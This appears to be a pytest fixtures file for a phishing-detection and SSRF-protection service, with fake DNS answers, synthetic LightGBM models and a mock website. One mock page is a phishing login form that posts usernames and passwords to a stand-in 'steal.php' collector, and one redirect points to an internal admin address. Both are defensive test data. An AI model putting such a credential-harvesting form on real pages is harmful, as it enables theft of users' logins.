from __future__ import annotations

import json
import sys
from pathlib import Path

import httpx
import joblib
import numpy as np
import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from app.features import FEATURE_SCHEMA_VERSION, HTML_FEATURE_NAMES, URL_FEATURE_NAMES, lists_fingerprint  # noqa: E402

PUBLIC_IP = "93.184.216.34"

# Fake DNS used by every network test: never touches the real network.
FAKE_DNS = {
    "example.com": [PUBLIC_IP],
    "www.example.com": [PUBLIC_IP],
    "evil.test": ["203.0.113.10"],  # TEST-NET-3 (reserved) -> must be blocked
    "rebind.example.org": ["93.184.216.35", "10.0.0.5"],  # one private answer -> blocked
    "internal.example.net": ["192.168.1.20"],
    "phish.example.net": ["198.51.100.7"],  # TEST-NET-2 (reserved) -> blocked
    "good.example.org": ["93.184.216.36"],
    "login-paypal-secure.example.com": [PUBLIC_IP],
}


def fake_resolver(host: str, port: int) -> list[str]:
    from app.security.ssrf import UnsafeURLError

    if host in FAKE_DNS:
        return FAKE_DNS[host]
    if host.endswith(".example.com"):
        return [PUBLIC_IP]
    raise UnsafeURLError(f"Could not resolve host '{host}'.")


@pytest.fixture
def resolver():
    return fake_resolver


class _ProbaModel:
    """Deterministic stand-in model: probability rises with a chosen feature."""

    def __init__(self, idx: int, scale: float):
        self.idx, self.scale = idx, scale

    def predict_proba(self, x):
        x = np.asarray(x, dtype=float)
        p = 1 / (1 + np.exp(-(x[:, self.idx] - self.scale)))
        return np.column_stack([1 - p, p])


@pytest.fixture
def model_dir(tmp_path: Path) -> Path:
    """A tiny but real versioned model directory (LightGBM trained on synthetic data)."""
    import lightgbm as lgb

    rng = np.random.default_rng(0)
    version = "vtest"
    vdir = tmp_path / "models" / version
    vdir.mkdir(parents=True)
    for key, names, signal in (("url", URL_FEATURE_NAMES, "sensitive_word_count"), ("content", HTML_FEATURE_NAMES, "HasPasswordField")):
        X = rng.random((400, len(names)))
        j = list(names).index(signal)
        y = (X[:, j] > 0.5).astype(int)
        X[:, j] = y * (1 + rng.random(400))
        m = lgb.LGBMClassifier(n_estimators=20, verbose=-1).fit(X, y)
        joblib.dump(
            {"model": m, "name": "LightGBM", "features": list(names), "feature_set": key, "explainer": "tree",
             "background": X[:50], "feature_schema_version": FEATURE_SCHEMA_VERSION, "lists_fingerprint": lists_fingerprint()},
            vdir / f"{key}_model.joblib",
        )
    (vdir / "metadata.json").write_text(json.dumps({"version": version}))
    (tmp_path / "models" / "latest.json").write_text(json.dumps({"version": version}))
    return tmp_path / "models"


PAGES = {
    "/": (200, "text/html", "<html><head><title>Example</title><link rel='icon' href='/f.ico'>"
          "<meta name='viewport' content='width=device-width'></head><body>"
          + "<p>Hello world, welcome to the example page.</p>" * 10
          + "<a href='/about'>About</a><a href='https://twitter.com/ex'>t</a> &copy; 2026</body></html>"),
    "/login": (200, "text/html", "<html><head><title>Sign in</title></head><body>"
               "<form action='https://collector.example.org/steal.php' method='post'>"
               "<input type='text' name='u'><input type='password' name='p'><input type='hidden' name='t'>"
               "<input type='submit'></form>" + "<p>Verify your account and payment details now.</p>" * 6 + "</body></html>"),
    "/redirect-internal": (302, "text/html", ""),
    "/redirect-good": (301, "text/html", ""),
    "/loop": (302, "text/html", ""),
    "/big": (200, "text/html", "<html>" + "A" * 50_000 + "</html>"),
    "/file.exe": (200, "application/octet-stream", "MZ" + "\x00" * 100),
    "/meta": (200, "text/html", "<html><head><meta http-equiv='refresh' content='0; url=/login'></head><body>" + "x" * 300 + "</body></html>"),
    "/robots.txt": (200, "text/plain", "User-agent: *\nDisallow:\n"),
}
LOCATIONS = {"/redirect-internal": "http://internal.example.net/admin", "/redirect-good": "/", "/loop": "/loop"}


def site_handler(request: httpx.Request) -> httpx.Response:
    path = request.url.path
    status, ctype, body = PAGES.get(path, (404, "text/html", "<html>not found</html>"))
    headers = {"content-type": f"{ctype}; charset=utf-8", "server": "mock"}
    if path in LOCATIONS:
        headers["location"] = LOCATIONS[path]
    return httpx.Response(status, headers=headers, content=body.encode("latin-1"))


@pytest.fixture
def site_transport():
    return httpx.MockTransport(site_handler)
